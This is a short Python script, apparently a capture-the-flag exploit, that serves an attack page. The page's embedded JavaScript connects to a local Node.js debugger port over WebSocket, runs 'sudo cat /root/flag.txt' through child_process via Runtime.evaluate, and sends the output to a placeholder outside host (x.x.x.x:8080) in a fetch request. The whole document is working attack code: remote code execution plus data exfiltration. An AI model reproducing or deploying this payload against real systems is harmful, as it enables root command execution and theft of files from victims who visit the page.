import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        content = f"<html><body>{message}</body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("""
<script type="text/javascript">
        const ws = new WebSocket(
            'ws://127.0.0.1:9229/UUID'
        );
        ws.onmessage = function (event) {
            fetch(`http://x.x.x.x:8080/?flag=${event.data}`);
        };
        ws.addEventListener("open", () => {
            ws.send(JSON.stringify({ id: 0, method: 'Runtime.evaluate', params: {expression: `process.mainModule.require('child_process').execSync('sudo cat /root/flag.txt') + ''`} }));
            fetch(`http://x.x.x.x:8080/test`);
        });
</script>
        	"""))

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Run a simple HTTP server")
    parser.add_argument(
        "-l",
        "--listen",
        default="localhost",
        help="Specify the IP address on which the server listens",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=8000,
        help="Specify the port on which the server listens",
    )
    args = parser.parse_args()
    run(addr=args.listen, port=args.port)